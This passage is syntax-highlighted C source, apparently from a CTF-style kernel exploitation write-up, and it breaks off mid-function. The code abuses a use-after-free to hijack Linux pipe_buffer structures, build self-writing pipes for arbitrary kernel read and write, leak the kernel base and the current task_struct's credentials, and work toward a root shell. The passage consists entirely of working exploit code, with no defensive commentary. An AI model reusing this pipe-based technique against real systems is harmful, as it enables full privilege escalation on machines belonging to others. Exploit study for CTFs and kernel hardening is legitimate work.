<span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="comment">// debug(&quot;write chunk data D&quot;);</span></span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;get victim chunk&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">second_page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write something to no.1 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.1 origin idx pipe to page-level-uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer,</span><br><span class="line">       SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page pointer: %p\n\t\tops: %p&quot;</span>, info_pipe_buf.page,</span><br><span class="line">           info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hit the UAF page successful&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;construct no.2 page level uaf&quot;</span>);</span><br><span class="line">  info_pipe_buf.page = (<span class="keyword">struct</span> page *)(<span class="number">0x40</span> + (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find no.2 page uaf by pipe tags&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> nr = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">// printf(&quot;%#x\n&quot;, nr);</span></span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUMS &amp;&amp; nr != i) &#123;</span><br><span class="line">      snd_origin_idx = nr;</span><br><span class="line">      snd_victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe victim_idx: %d&quot;</span>, snd_victim_idx);</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe origin_idx: %d&quot;</span>, snd_origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (snd_victim_idx == <span class="number">-1</span> || snd_origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;failed find snd pipe&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find no.2 idx sucessfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">construct_self_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page_ptr;</span><br><span class="line">  <span class="type">size_t</span> trd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (TRD_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write to no.2 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.2 origin pipe to make second page level uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == snd_origin_idx || i == victim_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl() pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 2 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">  evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">  evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 2 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_2 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 2: %d&quot;</span>, self_pipe_idx_2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_2 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 2!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 3 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_3 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 3: %d&quot;</span>, self_pipe_idx_3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_3 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 3!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try hijack pipe 4 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 4 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2 || i == self_pipe_idx_3) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_4 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 4: %d&quot;</span>, self_pipe_idx_4);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_4 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 4!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find self rw pipe 2 3 4 successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_evil_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;set up 2 3 4 pipe buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_2, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_3, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_4, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0xff8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* hijack 3 -&gt; 4 */</span></span><br><span class="line">  evil_pipe_buf_3.offset = TRD_PIPE_BUFS_SIZE * <span class="number">3</span>;</span><br><span class="line">  evil_pipe_buf_3.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ?? 4</span></span><br><span class="line">  <span class="comment">//  pipe  offset + len 3</span></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 to write pipe 4&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_4.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf_4.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_read</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0x1ff8</span>;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_read;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="comment">/* read 2 */</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_write</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_write;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">info_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;info leak&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;setup kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">  <span class="built_in">setup_evil_pipe</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;leaking something by search memory&quot;</span>);</span><br><span class="line">  vmemmap_base = (<span class="type">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">  <span class="comment">// log_info(&quot;vmemmap_base: %#lx&quot;, vmemmap_base);</span></span><br><span class="line">  <span class="comment">// debug(&quot;vmemmap_base&quot;);</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">      kernel_base = buf[<span class="number">0</span>] - <span class="number">0x070</span>;</span><br><span class="line">      kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;Found kernel base: %#lx\n\t\t&quot;</span></span><br><span class="line">          <span class="string">&quot;Kernel offset: %#lx&quot;</span>,</span><br><span class="line">          kernel_base, kernel_offset);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;vmemmap_base: %#lx&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;seek task_struct in memory...&quot;</span>);</span><br><span class="line">  <span class="built_in">prctl</span>(PR_SET_NAME, <span class="string">&quot;waterkernelpwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = <span class="built_in">memmem</span>(buf, <span class="number">0xf00</span>, <span class="string">&quot;waterkernelpwn&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>)           <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>)    <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123; <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">      parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">      current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">      page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">      page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">             (<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m%#lx\n&quot;</span>,</span><br><span class="line">             page_offset_base);</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">          <span class="string">&quot;%#lx\n\n&quot;</span>,</span><br><span class="line">          current_task);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_root_shell</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getuid</span>()) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">    <span 